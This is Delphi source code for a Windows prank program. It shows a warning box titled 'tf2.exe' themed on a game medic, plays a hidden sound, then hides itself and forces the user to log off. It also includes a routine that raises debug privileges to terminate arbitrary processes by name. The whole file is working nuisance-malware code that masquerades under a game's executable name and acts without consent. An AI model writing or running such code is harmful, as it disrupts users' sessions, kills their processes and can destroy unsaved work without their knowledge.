unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, MMSystem, ExtCtrls, TlHelp32;

type
  TForm1 = class(TForm)
    Image1: TImage;
    Timer1: TTimer;
    procedure FormCreate(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  Res: TResourceStream;

implementation

{$R *.dfm}

function ProcessTerminate(dwPID:Cardinal):Boolean;
var
 hToken:THandle;
 SeDebugNameValue:Int64;
 tkp:TOKEN_PRIVILEGES;
 ReturnLength:Cardinal;
 hProcess:THandle;
begin
 Result:=false;
 if not OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES
	or TOKEN_QUERY, hToken ) then
		exit;

 if not LookupPrivilegeValue( nil, 'SeDebugPrivilege', SeDebugNameValue )
	then begin
	 CloseHandle(hToken);
	 exit;
	end;

 tkp.PrivilegeCount:= 1;
 tkp.Privileges[0].Luid := SeDebugNameValue;
 tkp.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
 AdjustTokenPrivileges(hToken,false,tkp,SizeOf(tkp),tkp,ReturnLength);
 if GetLastError()<> ERROR_SUCCESS	then exit;
 hProcess := OpenProcess(PROCESS_TERMINATE, FALSE, dwPID);
 if hProcess =0	then exit;
	 if not TerminateProcess(hProcess, DWORD(-1))
		then exit;
 CloseHandle( hProcess );
 tkp.Privileges[0].Attributes := 0;
 AdjustTokenPrivileges(hToken, FALSE, tkp, SizeOf(tkp), tkp, ReturnLength);
 if GetLastError() <>	ERROR_SUCCESS
	then exit;

 Result:=true;
end;

procedure KillProc(procvictim: string);
 var
	hSnap:THandle;
	pe:TProcessEntry32;
begin
 pe.dwSize:=SizeOf(pe);
 hSnap:=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	If Process32First(hSnap,pe) then
		While Process32Next(hSnap,pe) do
			if ExtractFileName(pe.szExeFile)=(procvictim) then ProcessTerminate(pe.th32ProcessID);
end;
 
// Delphi proc-s
procedure TForm1.FormCreate(Sender: TObject);
begin
MessageBoxA(Form1.Handle, 'You need to rest of computer. Listen to the medic and do as he says.', 'tf2.exe', MB_OK + MB_ICONWARNING);
Res := TResourceStream.Create(HInstance, 'sound', 'WAVE');
Res.Position := 0;
SndPlaySound(res.Memory, SND_MEMORY or SND_ASYNC);
Res.free;
Timer1.Enabled := true;
end;

procedure TForm1.Timer1Timer(Sender: TObject);
begin
Form1.Hide;
Sleep(800);
ExitWindowsEx(EWX_LOGOFF, 0);
end;

end.
